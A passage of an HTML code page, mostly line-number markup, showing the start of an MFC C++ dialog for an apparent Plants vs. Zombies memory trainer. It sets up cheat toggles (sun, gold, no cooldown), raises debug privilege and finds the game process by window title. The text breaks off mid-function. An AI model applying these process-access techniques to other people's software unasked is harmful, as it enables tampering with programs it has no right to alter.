class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br><span class=\"line\">460</span><br><span class=\"line\">461</span><br><span class=\"line\">462</span><br><span class=\"line\">463</span><br><span class=\"line\">464</span><br><span class=\"line\">465</span><br><span class=\"line\">466</span><br><span class=\"line\">467</span><br><span class=\"line\">468</span><br><span class=\"line\">469</span><br><span class=\"line\">470</span><br><span class=\"line\">471</span><br><span class=\"line\">472</span><br><span class=\"line\">473</span><br><span class=\"line\">474</span><br><span class=\"line\">475</span><br><span class=\"line\">476</span><br><span class=\"line\">477</span><br><span class=\"line\">478</span><br><span class=\"line\">479</span><br><span class=\"line\">480</span><br><span class=\"line\">481</span><br><span class=\"line\">482</span><br><span class=\"line\">483</span><br><span class=\"line\">484</span><br><span class=\"line\">485</span><br><span class=\"line\">486</span><br><span class=\"line\">487</span><br><span class=\"line\">488</span><br><span class=\"line\">489</span><br><span class=\"line\">490</span><br><span class=\"line\">491</span><br><span class=\"line\">492</span><br><span class=\"line\">493</span><br><span class=\"line\">494</span><br><span class=\"line\">495</span><br><span class=\"line\">496</span><br><span class=\"line\">497</span><br><span class=\"line\">498</span><br><span class=\"line\">499</span><br><span class=\"line\">500</span><br><span class=\"line\">501</span><br><span class=\"line\">502</span><br><span class=\"line\">503</span><br><span class=\"line\">504</span><br><span class=\"line\">505</span><br><span class=\"line\">506</span><br><span class=\"line\">507</span><br><span class=\"line\">508</span><br><span class=\"line\">509</span><br><span class=\"line\">510</span><br><span class=\"line\">511</span><br><span class=\"line\">512</span><br><span class=\"line\">513</span><br><span class=\"line\">514</span><br><span class=\"line\">515</span><br><span class=\"line\">516</span><br><span class=\"line\">517</span><br><span class=\"line\">518</span><br><span class=\"line\">519</span><br><span class=\"line\">520</span><br><span class=\"line\">521</span><br><span class=\"line\">522</span><br><span class=\"line\">523</span><br><span class=\"line\">524</span><br><span class=\"line\">525</span><br><span class=\"line\">526</span><br><span class=\"line\">527</span><br><span class=\"line\">528</span><br><span class=\"line\">529</span><br><span class=\"line\">530</span><br><span class=\"line\">531</span><br><span class=\"line\">532</span><br><span class=\"line\">533</span><br><span class=\"line\">534</span><br><span class=\"line\">535</span><br><span class=\"line\">536</span><br><span class=\"line\">537</span><br><span class=\"line\">538</span><br><span class=\"line\">539</span><br><span class=\"line\">540</span><br><span class=\"line\">541</span><br><span class=\"line\">542</span><br><span class=\"line\">543</span><br><span class=\"line\">544</span><br><span class=\"line\">545</span><br><span class=\"line\">546</span><br><span class=\"line\">547</span><br><span class=\"line\">548</span><br><span class=\"line\">549</span><br><span class=\"line\">550</span><br><span class=\"line\">551</span><br><span class=\"line\">552</span><br><span class=\"line\">553</span><br><span class=\"line\">554</span><br><span class=\"line\">555</span><br><span class=\"line\">556</span><br><span class=\"line\">557</span><br><span class=\"line\">558</span><br><span class=\"line\">559</span><br><span class=\"line\">560</span><br><span class=\"line\">561</span><br><span class=\"line\">562</span><br><span class=\"line\">563</span><br><span class=\"line\">564</span><br><span class=\"line\">565</span><br><span class=\"line\">566</span><br><span class=\"line\">567</span><br><span class=\"line\">568</span><br><span class=\"line\">569</span><br><span class=\"line\">570</span><br><span class=\"line\">571</span><br><span class=\"line\">572</span><br><span class=\"line\">573</span><br><span class=\"line\">574</span><br><span class=\"line\">575</span><br><span class=\"line\">576</span><br><span class=\"line\">577</span><br><span class=\"line\">578</span><br><span class=\"line\">579</span><br><span class=\"line\">580</span><br><span class=\"line\">581</span><br><span class=\"line\">582</span><br><span class=\"line\">583</span><br><span class=\"line\">584</span><br><span class=\"line\">585</span><br><span class=\"line\">586</span><br><span class=\"line\">587</span><br><span class=\"line\">588</span><br><span class=\"line\">589</span><br><span class=\"line\">590</span><br><span class=\"line\">591</span><br><span class=\"line\">592</span><br><span class=\"line\">593</span><br><span class=\"line\">594</span><br><span class=\"line\">595</span><br><span class=\"line\">596</span><br><span class=\"line\">597</span><br><span class=\"line\">598</span><br><span class=\"line\">599</span><br><span class=\"line\">600</span><br><span class=\"line\">601</span><br><span class=\"line\">602</span><br><span class=\"line\">603</span><br><span class=\"line\">604</span><br><span class=\"line\">605</span><br><span class=\"line\">606</span><br><span class=\"line\">607</span><br><span class=\"line\">608</span><br><span class=\"line\">609</span><br><span class=\"line\">610</span><br><span class=\"line\">611</span><br><span class=\"line\">612</span><br><span class=\"line\">613</span><br><span class=\"line\">614</span><br><span class=\"line\">615</span><br><span class=\"line\">616</span><br><span class=\"line\">617</span><br><span class=\"line\">618</span><br><span class=\"line\">619</span><br><span class=\"line\">620</span><br><span class=\"line\">621</span><br><span class=\"line\">622</span><br><span class=\"line\">623</span><br><span class=\"line\">624</span><br><span class=\"line\">625</span><br><span class=\"line\">626</span><br><span class=\"line\">627</span><br><span class=\"line\">628</span><br><span class=\"line\">629</span><br><span class=\"line\">630</span><br><span class=\"line\">631</span><br><span class=\"line\">632</span><br><span class=\"line\">633</span><br><span class=\"line\">634</span><br><span class=\"line\">635</span><br><span class=\"line\">636</span><br><span class=\"line\">637</span><br><span class=\"line\">638</span><br><span class=\"line\">639</span><br><span class=\"line\">640</span><br><span class=\"line\">641</span><br><span class=\"line\">642</span><br><span class=\"line\">643</span><br><span class=\"line\">644</span><br><span class=\"line\">645</span><br><span class=\"line\">646</span><br><span class=\"line\">647</span><br><span class=\"line\">648</span><br><span class=\"line\">649</span><br><span class=\"line\">650</span><br><span class=\"line\">651</span><br><span class=\"line\">652</span><br><span class=\"line\">653</span><br><span class=\"line\">654</span><br><span class=\"line\">655</span><br><span class=\"line\">656</span><br><span class=\"line\">657</span><br><span class=\"line\">658</span><br><span class=\"line\">659</span><br><span class=\"line\">660</span><br><span class=\"line\">661</span><br><span class=\"line\">662</span><br><span class=\"line\">663</span><br><span class=\"line\">664</span><br><span class=\"line\">665</span><br><span class=\"line\">666</span><br><span class=\"line\">667</span><br><span class=\"line\">668</span><br><span class=\"line\">669</span><br><span class=\"line\">670</span><br><span class=\"line\">671</span><br><span class=\"line\">672</span><br><span class=\"line\">673</span><br><span class=\"line\">674</span><br><span class=\"line\">675</span><br><span class=\"line\">676</span><br><span class=\"line\">677</span><br><span class=\"line\">678</span><br><span class=\"line\">679</span><br><span class=\"line\">680</span><br><span class=\"line\">681</span><br><span class=\"line\">682</span><br><span class=\"line\">683</span><br><span class=\"line\">684</span><br><span class=\"line\">685</span><br><span class=\"line\">686</span><br><span class=\"line\">687</span><br><span class=\"line\">688</span><br><span class=\"line\">689</span><br><span class=\"line\">690</span><br><span class=\"line\">691</span><br><span class=\"line\">692</span><br><span class=\"line\">693</span><br><span class=\"line\">694</span><br><span class=\"line\">695</span><br><span class=\"line\">696</span><br><span class=\"line\">697</span><br><span class=\"line\">698</span><br><span class=\"line\">699</span><br><span class=\"line\">700</span><br><span class=\"line\">701</span><br><span class=\"line\">702</span><br><span class=\"line\">703</span><br><span class=\"line\">704</span><br><span class=\"line\">705</span><br><span class=\"line\">706</span><br><span class=\"line\">707</span><br><span class=\"line\">708</span><br><span class=\"line\">709</span><br><span class=\"line\">710</span><br><span class=\"line\">711</span><br><span class=\"line\">712</span><br><span class=\"line\">713</span><br><span class=\"line\">714</span><br><span class=\"line\">715</span><br><span class=\"line\">716</span><br><span class=\"line\">717</span><br><span class=\"line\">718</span><br><span class=\"line\">719</span><br><span class=\"line\">720</span><br><span class=\"line\">721</span><br><span class=\"line\">722</span><br><span class=\"line\">723</span><br><span class=\"line\">724</span><br><span class=\"line\">725</span><br><span class=\"line\">726</span><br><span class=\"line\">727</span><br><span class=\"line\">728</span><br><span class=\"line\">729</span><br><span class=\"line\">730</span><br><span class=\"line\">731</span><br><span class=\"line\">732</span><br><span class=\"line\">733</span><br><span class=\"line\">734</span><br><span class=\"line\">735</span><br><span class=\"line\">736</span><br><span class=\"line\">737</span><br><span class=\"line\">738</span><br><span class=\"line\">739</span><br><span class=\"line\">740</span><br><span class=\"line\">741</span><br><span class=\"line\">742</span><br><span class=\"line\">743</span><br><span class=\"line\">744</span><br><span class=\"line\">745</span><br><span class=\"line\">746</span><br><span class=\"line\">747</span><br><span class=\"line\">748</span><br><span class=\"line\">749</span><br><span class=\"line\">750</span><br><span class=\"line\">751</span><br><span class=\"line\">752</span><br><span class=\"line\">753</span><br><span class=\"line\">754</span><br><span class=\"line\">755</span><br><span class=\"line\">756</span><br><span class=\"line\">757</span><br><span class=\"line\">758</span><br><span class=\"line\">759</span><br><span class=\"line\">760</span><br><span class=\"line\">761</span><br><span class=\"line\">762</span><br><span class=\"line\">763</span><br><span class=\"line\">764</span><br><span class=\"line\">765</span><br><span class=\"line\">766</span><br><span class=\"line\">767</span><br><span class=\"line\">768</span><br><span class=\"line\">769</span><br><span class=\"line\">770</span><br><span class=\"line\">771</span><br><span class=\"line\">772</span><br><span class=\"line\">773</span><br><span class=\"line\">774</span><br><span class=\"line\">775</span><br><span class=\"line\">776</span><br><span class=\"line\">777</span><br><span class=\"line\">778</span><br><span class=\"line\">779</span><br><span class=\"line\">780</span><br><span class=\"line\">781</span><br><span class=\"line\">782</span><br><span class=\"line\">783</span><br><span class=\"line\">784</span><br><span class=\"line\">785</span><br><span class=\"line\">786</span><br><span class=\"line\">787</span><br><span class=\"line\">788</span><br><span class=\"line\">789</span><br><span class=\"line\">790</span><br><span class=\"line\">791</span><br><span class=\"line\">792</span><br><span class=\"line\">793</span><br><span class=\"line\">794</span><br><span class=\"line\">795</span><br><span class=\"line\">796</span><br><span class=\"line\">797</span><br><span class=\"line\">798</span><br><span class=\"line\">799</span><br><span class=\"line\">800</span><br><span class=\"line\">801</span><br><span class=\"line\">802</span><br><span class=\"line\">803</span><br><span class=\"line\">804</span><br><span class=\"line\">805</span><br><span class=\"line\">806</span><br><span class=\"line\">807</span><br><span class=\"line\">808</span><br><span class=\"line\">809</span><br><span class=\"line\">810</span><br><span class=\"line\">811</span><br><span class=\"line\">812</span><br><span class=\"line\">813</span><br><span class=\"line\">814</span><br><span class=\"line\">815</span><br><span class=\"line\">816</span><br><span class=\"line\">817</span><br><span class=\"line\">818</span><br><span class=\"line\">819</span><br><span class=\"line\">820</span><br><span class=\"line\">821</span><br><span class=\"line\">822</span><br><span class=\"line\">823</span><br><span class=\"line\">824</span><br><span class=\"line\">825</span><br><span class=\"line\">826</span><br><span class=\"line\">827</span><br><span class=\"line\">828</span><br><span class=\"line\">829</span><br><span class=\"line\">830</span><br><span class=\"line\">831</span><br><span class=\"line\">832</span><br><span class=\"line\">833</span><br><span class=\"line\">834</span><br><span class=\"line\">835</span><br><span class=\"line\">836</span><br><span class=\"line\">837</span><br><span class=\"line\">838</span><br><span class=\"line\">839</span><br><span class=\"line\">840</span><br><span class=\"line\">841</span><br><span class=\"line\">842</span><br><span class=\"line\">843</span><br><span class=\"line\">844</span><br><span class=\"line\">845</span><br><span class=\"line\">846</span><br><span class=\"line\">847</span><br><span class=\"line\">848</span><br><span class=\"line\">849</span><br><span class=\"line\">850</span><br><span class=\"line\">851</span><br><span class=\"line\">852</span><br><span class=\"line\">853</span><br><span class=\"line\">854</span><br><span class=\"line\">855</span><br><span class=\"line\">856</span><br><span class=\"line\">857</span><br><span class=\"line\">858</span><br><span class=\"line\">859</span><br><span class=\"line\">860</span><br><span class=\"line\">861</span><br><span class=\"line\">862</span><br><span class=\"line\">863</span><br><span class=\"line\">864</span><br><span class=\"line\">865</span><br><span class=\"line\">866</span><br><span class=\"line\">867</span><br><span class=\"line\">868</span><br><span class=\"line\">869</span><br><span class=\"line\">870</span><br><span class=\"line\">871</span><br><span class=\"line\">872</span><br><span class=\"line\">873</span><br><span class=\"line\">874</span><br><span class=\"line\">875</span><br><span class=\"line\">876</span><br><span class=\"line\">877</span><br><span class=\"line\">878</span><br><span class=\"line\">879</span><br><span class=\"line\">880</span><br><span class=\"line\">881</span><br><span class=\"line\">882</span><br><span class=\"line\">883</span><br><span class=\"line\">884</span><br><span class=\"line\">885</span><br><span class=\"line\">886</span><br><span class=\"line\">887</span><br><span class=\"line\">888</span><br><span class=\"line\">889</span><br><span class=\"line\">890</span><br><span class=\"line\">891</span><br><span class=\"line\">892</span><br><span class=\"line\">893</span><br><span class=\"line\">894</span><br><span class=\"line\">895</span><br><span class=\"line\">896</span><br><span class=\"line\">897</span><br><span class=\"line\">898</span><br><span class=\"line\">899</span><br><span class=\"line\">900</span><br><span class=\"line\">901</span><br><span class=\"line\">902</span><br><span class=\"line\">903</span><br><span class=\"line\">904</span><br><span class=\"line\">905</span><br><span class=\"line\">906</span><br><span class=\"line\">907</span><br><span class=\"line\">908</span><br><span class=\"line\">909</span><br><span class=\"line\">910</span><br><span class=\"line\">911</span><br><span class=\"line\">912</span><br><span class=\"line\">913</span><br><span class=\"line\">914</span><br><span class=\"line\">915</span><br><span class=\"line\">916</span><br><span class=\"line\">917</span><br><span class=\"line\">918</span><br><span class=\"line\">919</span><br><span class=\"line\">920</span><br><span class=\"line\">921</span><br><span class=\"line\">922</span><br><span class=\"line\">923</span><br><span class=\"line\">924</span><br><span class=\"line\">925</span><br><span class=\"line\">926</span><br><span class=\"line\">927</span><br><span class=\"line\">928</span><br><span class=\"line\">929</span><br><span class=\"line\">930</span><br><span class=\"line\">931</span><br><span class=\"line\">932</span><br><span class=\"line\">933</span><br><span class=\"line\">934</span><br><span class=\"line\">935</span><br><span class=\"line\">936</span><br><span class=\"line\">937</span><br><span class=\"line\">938</span><br><span class=\"line\">939</span><br><span class=\"line\">940</span><br><span class=\"line\">941</span><br><span class=\"line\">942</span><br><span class=\"line\">943</span><br><span class=\"line\">944</span><br><span class=\"line\">945</span><br><span class=\"line\">946</span><br><span class=\"line\">947</span><br><span class=\"line\">948</span><br><span class=\"line\">949</span><br><span class=\"line\">950</span><br><span class=\"line\">951</span><br><span class=\"line\">952</span><br><span class=\"line\">953</span><br><span class=\"line\">954</span><br><span class=\"line\">955</span><br><span class=\"line\">956</span><br><span class=\"line\">957</span><br><span class=\"line\">958</span><br><span class=\"line\">959</span><br><span class=\"line\">960</span><br><span class=\"line\">961</span><br><span class=\"line\">962</span><br><span class=\"line\">963</span><br><span class=\"line\">964</span><br><span class=\"line\">965</span><br><span class=\"line\">966</span><br><span class=\"line\">967</span><br><span class=\"line\">968</span><br><span class=\"line\">969</span><br><span class=\"line\">970</span><br><span class=\"line\">971</span><br><span class=\"line\">972</span><br><span class=\"line\">973</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// plantDlg.cpp : 实现文件</span><br><span class=\"line\">//</span><br><span class=\"line\"></span><br><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &quot;plant.h&quot;</span><br><span class=\"line\">#include &quot;plantDlg.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">#ifdef _DEBUG</span><br><span class=\"line\">#define new DEBUG_NEW</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">// 用于应用程序“关于”菜单项的 CAboutDlg 对话框</span><br><span class=\"line\"></span><br><span class=\"line\">class CAboutDlg : public CDialog</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\tCAboutDlg();</span><br><span class=\"line\"></span><br><span class=\"line\">// 对话框数据</span><br><span class=\"line\">\tenum &#123; IDD = IDD_ABOUTBOX &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\tprotected:</span><br><span class=\"line\">\tvirtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持</span><br><span class=\"line\"></span><br><span class=\"line\">// 实现</span><br><span class=\"line\">protected:</span><br><span class=\"line\">\tDECLARE_MESSAGE_MAP()</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CAboutDlg::DoDataExchange(CDataExchange* pDX)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tCDialog::DoDataExchange(pDX);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)</span><br><span class=\"line\">END_MESSAGE_MAP()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">// CplantDlg 对话框</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">CplantDlg::CplantDlg(CWnd* pParent /*=NULL*/)</span><br><span class=\"line\">\t: CDialog(CplantDlg::IDD, pParent)</span><br><span class=\"line\">\t, m_edit_sun(9999)</span><br><span class=\"line\">\t, m_edit_gold(9999)</span><br><span class=\"line\">\t, m_nocd(FALSE)</span><br><span class=\"line\">\t, m_bigmouth_nocd(FALSE)</span><br><span class=\"line\">\t, m_x(0)</span><br><span class=\"line\">\t, m_y(0)</span><br><span class=\"line\">\t, m_noblood(FALSE)</span><br><span class=\"line\">\t, no_run(FALSE)</span><br><span class=\"line\">\t, no_pit(FALSE)</span><br><span class=\"line\">\t, m_nomubei(FALSE)</span><br><span class=\"line\">\t, m_tudou(FALSE)</span><br><span class=\"line\">\t, m_frozen(FALSE)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tm_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::DoDataExchange(CDataExchange* pDX)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tCDialog::DoDataExchange(pDX);</span><br><span class=\"line\">\tDDX_Text(pDX, IDC_EDIT1, m_edit_sun);</span><br><span class=\"line\">\tDDX_Text(pDX, IDC_EDIT2, m_edit_gold);</span><br><span class=\"line\">\tDDX_Check(pDX, IDC_CHECK1, m_nocd);</span><br><span class=\"line\">\tDDX_Check(pDX, IDC_CHECK2, m_bigmouth_nocd);</span><br><span class=\"line\">\tDDX_Text(pDX, IDC_EDIT3, m_x);</span><br><span class=\"line\">\tDDX_Text(pDX, IDC_EDIT4, m_y);</span><br><span class=\"line\">\tDDX_Control(pDX, IDC_COMBO1, m_cbPlantsChoose);</span><br><span class=\"line\">\tDDX_Check(pDX, IDC_CHECK3, m_noblood);</span><br><span class=\"line\">\tDDX_Check(pDX, IDC_CHECK4, no_run);</span><br><span class=\"line\">\tDDX_Check(pDX, IDC_CHECK5, no_pit);</span><br><span class=\"line\">\tDDX_Check(pDX, IDC_CHECK6, m_nomubei);</span><br><span class=\"line\">\tDDX_Check(pDX, IDC_CHECK7, m_tudou);</span><br><span class=\"line\">\tDDX_Check(pDX, IDC_CHECK8, m_frozen);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BEGIN_MESSAGE_MAP(CplantDlg, CDialog)</span><br><span class=\"line\">\tON_WM_SYSCOMMAND()</span><br><span class=\"line\">\tON_WM_PAINT()</span><br><span class=\"line\">\tON_WM_QUERYDRAGICON()</span><br><span class=\"line\">\t//&#125;&#125;AFX_MSG_MAP</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_BUTTON1, &amp;CplantDlg::OnBnClickedButton1)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_BUTTON2, &amp;CplantDlg::OnBnClickedButton2)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_BUTTON3, &amp;CplantDlg::OnBnClickedButton3)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_BUTTON4, &amp;CplantDlg::OnBnClickedButton4)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_CHECK1, &amp;CplantDlg::OnBnClickedCheck1)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_CHECK2, &amp;CplantDlg::OnBnClickedCheck2)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_BUTTON5, &amp;CplantDlg::OnBnClickedButton5)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_BUTTON6, &amp;CplantDlg::OnBnClickedButton6)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_CHECK3, &amp;CplantDlg::OnBnClickedCheck3)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_CHECK4, &amp;CplantDlg::OnBnClickedCheck4)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_CHECK5, &amp;CplantDlg::OnBnClickedCheck5)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_CHECK6, &amp;CplantDlg::OnBnClickedCheck6)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_BUTTON7, &amp;CplantDlg::OnBnClickedButton7)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_CHECK7, &amp;CplantDlg::OnBnClickedCheck7)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_CHECK8, &amp;CplantDlg::OnBnClickedCheck8)</span><br><span class=\"line\">END_MESSAGE_MAP()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">// CplantDlg 消息处理程序</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL CplantDlg::OnInitDialog()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tCDialog::OnInitDialog();</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 将“关于...”菜单项添加到系统菜单中。</span><br><span class=\"line\"></span><br><span class=\"line\">\t// IDM_ABOUTBOX 必须在系统命令范围内。</span><br><span class=\"line\">\tASSERT((IDM_ABOUTBOX &amp; 0xFFF0) == IDM_ABOUTBOX);</span><br><span class=\"line\">\tASSERT(IDM_ABOUTBOX &lt; 0xF000);</span><br><span class=\"line\"></span><br><span class=\"line\">\tenableDebugPriv();</span><br><span class=\"line\"></span><br><span class=\"line\">\tCMenu* pSysMenu = GetSystemMenu(FALSE);</span><br><span class=\"line\">\tif (pSysMenu != NULL)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tCString strAboutMenu;</span><br><span class=\"line\">\t\tstrAboutMenu.LoadString(IDS_ABOUTBOX);</span><br><span class=\"line\">\t\tif (!strAboutMenu.IsEmpty())</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tpSysMenu-&gt;AppendMenu(MF_SEPARATOR);</span><br><span class=\"line\">\t\t\tpSysMenu-&gt;AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动</span><br><span class=\"line\">\t//  执行此操作</span><br><span class=\"line\">\tSetIcon(m_hIcon, TRUE);\t\t\t// 设置大图标</span><br><span class=\"line\">\tSetIcon(m_hIcon, FALSE);\t\t// 设置小图标</span><br><span class=\"line\"></span><br><span class=\"line\">\t// TODO: 在此添加额外的初始化代码</span><br><span class=\"line\">\taddPlantsToCombox();</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn TRUE;  // 除非将焦点设置到控件，否则返回 TRUE</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnSysCommand(UINT nID, LPARAM lParam)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tif ((nID &amp; 0xFFF0) == IDM_ABOUTBOX)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tCAboutDlg dlgAbout;</span><br><span class=\"line\">\t\tdlgAbout.DoModal();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tCDialog::OnSysCommand(nID, lParam);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 如果向对话框添加最小化按钮，则需要下面的代码</span><br><span class=\"line\">//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，</span><br><span class=\"line\">//  这将由框架自动完成。</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnPaint()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tif (IsIconic())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tCPaintDC dc(this); // 用于绘制的设备上下文</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tSendMessage(WM_ICONERASEBKGND, reinterpret_cast&lt;WPARAM&gt;(dc.GetSafeHdc()), 0);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// 使图标在工作区矩形中居中</span><br><span class=\"line\">\t\tint cxIcon = GetSystemMetrics(SM_CXICON);</span><br><span class=\"line\">\t\tint cyIcon = GetSystemMetrics(SM_CYICON);</span><br><span class=\"line\">\t\tCRect rect;</span><br><span class=\"line\">\t\tGetClientRect(&amp;rect);</span><br><span class=\"line\">\t\tint x = (rect.Width() - cxIcon + 1) / 2;</span><br><span class=\"line\">\t\tint y = (rect.Height() - cyIcon + 1) / 2;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// 绘制图标</span><br><span class=\"line\">\t\tdc.DrawIcon(x, y, m_hIcon);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tCDialog::OnPaint();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//当用户拖动最小化窗口时系统调用此函数取得光标</span><br><span class=\"line\">//显示。</span><br><span class=\"line\">HCURSOR CplantDlg::OnQueryDragIcon()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn static_cast&lt;HCURSOR&gt;(m_hIcon);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD CplantDlg::FindGameProcessidByWndTitle(CString strTitle)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDWORD pid = 0;</span><br><span class=\"line\">\tHWND hWnd = ::FindWindow(NULL, strTitle.GetBuffer());   //找到窗口</span><br><span class=\"line\">\tif (NULL == hWnd)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未找到指定游戏&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn 0;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tGetWindowThreadProcessId(hWnd, &amp;pid);  //通过窗口句柄拿到进程ID</span><br><span class=\"line\">\treturn pid;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedButton1()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD 